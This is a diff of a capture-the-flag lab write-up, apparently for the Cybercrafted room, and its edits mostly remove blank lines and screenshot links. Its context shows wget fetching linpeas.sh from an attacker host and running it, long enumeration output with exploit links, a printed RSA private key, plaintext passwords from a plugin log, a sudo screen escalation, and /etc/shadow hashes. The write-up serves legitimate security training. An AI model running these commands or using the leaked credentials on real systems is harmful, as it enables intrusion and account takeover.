@@ -939,7 +939,6 @@ f: fifo (named pipe)
 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
 10.10.88.215 - - [08/Mar/2023 13:59:16] "GET /linpeas.sh HTTP/1.1" 200 -
 
-
 www-data@cybercrafted:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
 wget http://10.8.19.103:1234/linpeas.sh
 --2023-03-08 18:59:16--  http://10.8.19.103:1234/linpeas.sh
@@ -958,7 +957,6 @@ www-data@cybercrafted:/tmp$ ./linpeas.sh
 
 www-data@cybercrafted:/tmp$ ./linpeas.sh
 ./linpeas.sh
-
 
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
@@ -1020,8 +1018,6 @@ Writable folder: /dev/shm
 [+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
 [+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
 
-
-
 Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
 
                               ╔════════════════════╗
@@ -1043,8 +1039,6 @@ Sudo version 1.8.21p2
 Vulnerable to CVE-2021-4034
 
 Potentially Vulnerable to CVE-2022-2588
-
-
 
 ╔══════════╣ PATH
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
@@ -1178,7 +1172,6 @@ https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
    Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
    Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
 
-
 ╔══════════╣ Executing Linux Exploit Suggester 2
 ╚ https://github.com/jondonas/linux-exploit-suggester-2
 
@@ -1206,7 +1199,6 @@ apparmor module is loaded.
 ╔══════════╣ Container details
 ═╣ Is this a container? ........... No
 ═╣ Any running containers? ........ No
-
 
                                      ╔═══════╗
 ═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
@@ -1244,13 +1236,9 @@ PrivateIPv6s:
 Subnet IPv6: 
 Public IPv4s:
 
-
-
 ══╣ IAM Role
 
-
 ══╣ User Data
-
 
                 ╔════════════════════════════════════════════════╗
 ════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
@@ -1503,7 +1491,6 @@ org.freedesktop.systemd1               1 systemd         root             :1.3  
 org.freedesktop.thermald               - -               -                (activatable) -                         -         
 org.freedesktop.timedate1              - -               -                (activatable) -                         -         
 
-
                               ╔═════════════════════╗
 ══════════════════════════════╣ Network Information ╠══════════════════════════════
                               ╚═════════════════════╝
@@ -1543,7 +1530,6 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX packets 4097  bytes 405019 (405.0 KB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
-
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
@@ -1555,8 +1541,6 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 
 ╔══════════╣ Can I sniff with tcpdump?
 No
-
-
 
                                ╔═══════════════════╗
 ═══════════════════════════════╣ Users Information ╠═══════════════════════════════
@@ -1651,8 +1635,6 @@ Username         Port     From             Latest
 
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
 
-
-
                              ╔══════════════════════╗
 ═════════════════════════════╣ Software Information ╠═════════════════════════════
                              ╚══════════════════════╝
@@ -1678,7 +1660,6 @@ ii  gcc-7                                  7.5.0-3ubuntu1~18.04                 
 
 ╔══════════╣ MySQL version
 mysql  Ver 14.14 Distrib 5.7.35, for Linux (x86_64) using  EditLine wrapper
-
 
 ═╣ MySQL connection using default root/root ........... No
 ═╣ MySQL connection using root/toor ................... No
@@ -1751,7 +1732,6 @@ lrwxrwxrwx 1 root root 32 Sep 12  2021 /etc/apache2/sites-enabled/main.thm.conf 
 	CustomLog ${APACHE_LOG_DIR}/access.log combined
 </VirtualHost>
 
-
 -rw-r--r-- 1 root root 1328 Jun 26  2021 /etc/apache2/sites-available/000-default.conf
 <VirtualHost *:80>
 	ServerAdmin admin@localhost
@@ -1775,8 +1755,6 @@ ibase.allow_persistent = 1
 mysqli.allow_persistent = On
 pgsql.allow_persistent = On
 
-
-
 ╔══════════╣ Analyzing Rsync Files (limit 70)
 -rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
 [ftp]
@@ -1796,11 +1774,9 @@ pgsql.allow_persistent = On
 	refuse options = checksum dry-run
 	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
 
-
 ╔══════════╣ Analyzing Ldap Files (limit 70)
 The password hash is from the {SSHA} to 'structural'
 drwxr-xr-x 2 root root 4096 Jun 26  2021 /etc/ldap
-
 
 ╔══════════╣ Searching ssl/ssh files
 ╔══════════╣ Analyzing SSH Files (limit 70)
@@ -1836,8 +1812,6 @@ RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
 v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
 -----END RSA PRIVATE KEY-----
 
-
-
 -rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 414 Jun 27  2021 /home/xxultimatecreeperxx/.ssh/authorized_keys
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCujxl8VJ5ZqkNb8zznyHX1ql42X8PiJ/4BrWOR9Oytc6wghw2SM7QC5iajDwA/ZMxY3zyTz3m79w/0eVV39TFCP/UsY3rybk0RJMfXX+24TwTThx1NZGcliMz9jSA5FaxCV9SebGyFOFcIPxeBDx86vLOrTN/hizefiYzq0C/wDVrc9PY9GuFnC0txjVZqLm1ZW92tb7LqsCO551MHerx3+bmmSDqhuWqKE1zAB/4eWhqL3leuhSr4lTjGn2MuxKh7TIdP1BqOqcCcgbB5ELnVbNGLlxUS+kBp1+u9UzzUYQ0whYLKUxePZyDNtHcPiUjH5cMj3ZGidsJRKbPPzVUN xxultimatecreeperxx@cybercrafted
 
@@ -1864,7 +1838,6 @@ Subsystem	sftp	/usr/lib/openssh/sftp-server
 ══╣ /etc/hosts.allow file found, trying to read the rules:
 /etc/hosts.allow
 
-
 Searching inside /etc/ssh/ssh_config for interesting info
 Host *
     SendEnv LANG LC_*
@@ -1875,13 +1848,9 @@ Host *
 drwxr-xr-x 2 root root 4096 Sep 12  2021 /etc/pam.d
 -rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd
 
-
-
-
 ╔══════════╣ Searching tmux sessions
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
 tmux 2.6
-
 
 /tmp/tmux-33
 ╔══════════╣ Analyzing Cloud Init Files (limit 70)
@@ -1890,9 +1859,6 @@ tmux 2.6
 
 ╔══════════╣ Analyzing Keyring Files (limit 70)
 drwxr-xr-x 2 root root 4096 Jun 26  2021 /usr/share/keyrings
-
-
-
 
 ╔══════════╣ Searching uncommon passwd files (splunk)
 passwd file: /etc/pam.d/passwd
@@ -1927,96 +1893,30 @@ drwx------ 3 xxultimatecreeperxx xxultimatecreeperxx 4096 Jun 27  2021 /home/xxu
 
 lrwxrwxrwx 1 root root 9 Oct 15  2021 /home/xxultimatecreeperxx/.viminfo -> /dev/null
 
-
 ╔══════════╣ Analyzing Postfix Files (limit 70)
 -rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix
 
-
 ╔══════════╣ Analyzing FTP Files (limit 70)
-
 
 -rw-r--r-- 1 root root 69 Oct  7  2020 /etc/php/7.2/mods-available/ftp.ini
 -rw-r--r-- 1 root root 69 Jul  5  2021 /usr/share/php7.2-common/common/ftp.ini
-
-
-
-
-
 
 ╔══════════╣ Analyzing Bind Files (limit 70)
 -rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
 -rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
 
-
-
 ╔══════════╣ Analyzing Windows Files (limit 70)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 lrwxrwxrwx 1 root root 20 Jun 26  2021 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
 lrwxrwxrwx 1 root root 24 Jun 26  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
 -rw-r--r-- 1 root root 81 Sep 12  2021 /var/lib/dpkg/alternatives/my.cnf
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ╔══════════╣ Analyzing Other Interesting Files (limit 70)
 -rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
 -rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 3771 Jun 27  2021 /home/xxultimatecreeperxx/.bashrc
 
-
-
-
-
 -rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
 -rw-r--r-- 1 xxultimatecreeperxx xxultimatecreeperxx 807 Jun 27  2021 /home/xxultimatecreeperxx/.profile
-
-
-
-
-
 
                                ╔═══════════════════╗
 ═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
@@ -2261,7 +2161,6 @@ logrotate 3.11.0
 ╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
 Found /var/lib/mlocate/mlocate.db: regular file, no read permission
 
-
 ╔══════════╣ Web files?(output limit)
 /var/www/:
 total 24K
@@ -2497,8 +2396,6 @@ drwxr-xr-x  4 www-data www-data 4.0K Sep 12  2021 tld
 2021-10-15 20:36:15,487 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
 2021-10-15 20:36:15,487 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
 
-
-
                                 ╔════════════════╗
 ════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                 ╚════════════════╝
@@ -2574,7 +2471,6 @@ fYGHuf6juOc3Ub1iDV1B4Gk0964vclePoG+rdMXWK+HmdxfNHDiZyN4taQgBp656
 RKTM49I7MsdD/uTK9CyHQGE9q2PekljkjdzCrwcW6xLhYILruayX1B4IWqr/p55k
 v6+jjQHOy6a0Qm23OwrhKhO8kn1OdQMWqftf2D3hEuBKR/FXLIughjmyR1j9JFtJ
 -----END RSA PRIVATE KEY-----
-
 
 ┌──(witty㉿kali)-[/tmp]
 └─$ chmod 600 id_rsa_minecr      
@@ -2711,7 +2607,6 @@ xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem
 [2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition>Bedrock
 [2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
 [2021/06/27 11:59:01] madrinch logged in. PW: Password123
-
 
 [2021/10/15 17:13:45] [BUKKIT-SERVER] Startet LoginSystem!
 [2021/10/15 20:36:21] [BUKKIT-SERVER] Startet LoginSystem!
@@ -2899,7 +2794,6 @@ cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cp /home/cybercra
 cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls
 BukkitTTY-0.0.2.jar  LoginSystem  LoginSystem_v.2.4.jar
 
-
 cybercrafted@cybercrafted:~$ sudo /usr/bin/screen -r cybercrafted
 -Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
         at net.minecraft.server.v1_7_R1.MinecraftServer.a(MinecraftServer.java:275) [craftbukkit-1.7.2-server.jar:git-Bukkit-1.7.2-R0.3-2-g85f5776-b3023jnks]
@@ -3018,24 +2912,7 @@ mysql:!:18804:0:99999:7:::
 xxultimatecreeperxx:$6$YVPtRid3$yHsAoVRdkH7V0onPbefgRPeyj1xrBNxnzyZKIopigxaMB088YDW/4UkLIQ4A9ivEQwcMVkGhRhA2.u8GeyZiD.:18805:0:99999:7:::
 cybercrafted:$6$F6ChzVlS$O4FKDNkV0xyfhBelxIU68Lo3GCyA9RHWt8OgpYixA8nWacYynElKj9BiQ0vLIIi.r3FP3Z37nR5gaDHdSbVrF/:18805:0:99999:7:::
 
-
 ```
-
-![[Pasted image 20230308121024.png]]
-
-![[Pasted image 20230308121423.png]]
-
-![[Pasted image 20230308125628.png]]
-
-![[Pasted image 20230308125751.png]]
-![[Pasted image 20230308131807.png]]
-
-
-
-
-
-
-
 
 How many ports are open?
 
@@ -3088,6 +2965,5 @@ Answer the questions below
 Good luck on your future adventures!
 
 Question Done
-
 
 [[LocalPotato]]
